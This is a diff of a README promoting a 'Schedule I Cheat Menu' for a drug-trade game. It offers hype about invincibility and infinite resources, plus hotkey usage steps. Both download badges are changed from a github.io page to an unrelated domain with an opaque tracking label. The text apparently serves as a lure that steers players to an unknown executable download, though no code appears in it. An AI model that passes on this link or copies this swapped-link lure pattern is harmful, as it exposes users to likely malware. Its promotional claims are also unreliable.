@@ -2,7 +2,7 @@
 
 The **Schedule I Cheat Menu** is the ultimate tool for players who want to rule the dangerous and thrilling world of drug lords. With this cheat menu, you'll gain access to a variety of powerful features that will make you unstoppable. Whether you're looking to manage your empire more efficiently, crush your competition, or just have some fun, the **Schedule I Cheat Menu** provides everything you need to conquer the game.
 
-[![Download Schedule CheatMenu](https://img.shields.io/badge/Download-Schedule%20CheatMenu-blueviolet)](https://schedule-i-cheat-menu.github.io/.github/)
+[![Download Schedule CheatMenu](https://img.shields.io/badge/Download-Schedule%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 From infinite resources to invincibility and instant victories, this cheat menu lets you control every aspect of your criminal empire. It's perfect for players who want to explore the game without limits, progress faster, and experience all the power that comes with being at the top of the drug trade.
 
@@ -42,4 +42,4 @@ The **Schedule I Cheat Menu** is designed for **Schedule I**, the game based on 
 4. Open the cheat menu using the designated hotkey (e.g., *Insert*).
 5. Customize your settings and start using the cheats to dominate the drug lord world!
 
-[![Download Schedule CheatMenu](https://img.shields.io/badge/Download-Schedule%20CheatMenu-blueviolet)](https://schedule-i-cheat-menu.github.io/.github/)
+[![Download Schedule CheatMenu](https://img.shields.io/badge/Download-Schedule%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
